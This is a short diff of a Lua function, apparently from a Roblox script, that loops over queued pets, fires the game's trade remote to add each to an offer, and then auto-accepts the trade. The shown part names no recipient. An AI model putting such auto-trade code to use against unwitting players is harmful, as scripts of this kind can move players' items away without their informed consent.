@@ -297,12 +297,18 @@ local function TradePets()
                     if frame.Visible == true then
 wait(5)
                         while #processedFrames > 0 do
-                            local args = {
-                                [1] = processedFrames[1]
-                            }
-                            game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(unpack(args))
-                            table.remove(processedFrames, 1)
-                        end
+    if processedFrames[1] == "add_more_pets" then
+        table.remove(processedFrames, 1) -- Remove it without running the remote
+    else
+        local args = {
+            [1] = processedFrames[1]
+        }
+        game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(unpack(args))
+        table.remove(processedFrames, 1) -- Remove after running the remote
+wait(5)
+    end
+end
+
 
                         wait(3)
                         game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
